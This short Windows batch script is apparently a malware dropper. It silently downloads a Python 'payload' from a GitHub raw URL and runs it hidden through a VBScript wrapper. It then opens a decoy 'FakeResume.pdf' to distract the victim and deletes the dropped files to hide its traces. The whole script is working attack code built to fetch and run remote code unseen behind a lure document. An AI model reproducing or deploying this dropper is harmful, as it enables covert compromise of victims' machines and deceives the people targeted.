@echo off

REM Download payload
curl -s https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py -o "%temp%\user.py"

REM Run Python COMPLETELY HIDDEN using VBScript wrapper
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\run.vbs"
echo WshShell.Run "python %temp%\user.py", 0, False >> "%temp%\run.vbs"
cscript //nologo "%temp%\run.vbs"

REM Download PDF
curl -s -L https://github.com/workspacehome0/download/raw/main/FakeResume.pdf -o "%temp%\FakeResume.pdf"

REM Open PDF
start "" "%temp%\FakeResume.pdf"

REM Cleanup
del "%temp%\run.vbs"
del "%temp%\user.py"

exit
